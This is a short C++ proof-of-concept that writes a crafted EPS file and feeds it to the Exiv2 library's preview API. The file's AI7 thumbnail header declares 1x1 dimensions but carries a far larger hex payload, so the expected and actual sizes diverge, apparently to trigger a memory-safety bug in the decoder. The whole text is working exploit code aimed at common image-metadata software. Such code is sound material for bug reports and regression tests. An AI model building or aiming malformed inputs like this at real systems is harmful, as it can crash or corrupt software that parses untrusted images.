// PoC: extract the AI7/Illustrator preview thumbnail of a crafted EPS image
// through the public Exiv2 preview API.
#include <exiv2/exiv2.hpp>

#include <cstdio>
#include <fstream>
#include <string>

static std::string makeEps() {
  // 256*3 color-table bytes + image-data bytes, all encoded as hex nibbles.
  // The declared thumbnail dimensions are tiny (1x1) while the decoded RGB
  // payload is large, so expected-size and actual-size diverge.
  const size_t colorTableBytes = 256 * 3;
  const size_t imageBytes = 1024;
  const size_t totalBytes = colorTableBytes + imageBytes;

  std::string hex;
  hex.reserve(totalBytes * 2);
  for (size_t i = 0; i < totalBytes; ++i)
    hex += "00";  // 0x00 image bytes -> non-RLE, index 0 into color table

  std::string eps;
  eps += "%!PS-Adobe-3.1 EPSF-3.0\n";
  eps += "%AI7_Thumbnail: 1 1 8\n";
  eps += "%%BeginData: " + std::to_string(totalBytes) + " Hex Bytes\n";
  for (size_t i = 0; i < hex.size(); i += 64)
    eps += "%" + hex.substr(i, 64) + "\n";
  eps += "%%EndData\n";
  eps += "%%EOF\n";
  return eps;
}

int main(int argc, char** argv) {
  std::string path = (argc > 1) ? argv[1] : "/tmp/ai7_poc.eps";
  {
    std::ofstream f(path, std::ios::binary);
    const std::string eps = makeEps();
    f.write(eps.data(), static_cast<std::streamsize>(eps.size()));
  }

  auto image = Exiv2::ImageFactory::open(path);
  if (!image)
    return 2;
  image->readMetadata();

  Exiv2::PreviewManager manager(*image);
  Exiv2::PreviewPropertiesList list = manager.getPreviewProperties();
  for (const auto& props : list) {
    Exiv2::PreviewImage preview = manager.getPreviewImage(props);
    std::fprintf(stderr, "preview size=%u\n", preview.size());
  }
  return 0;
}
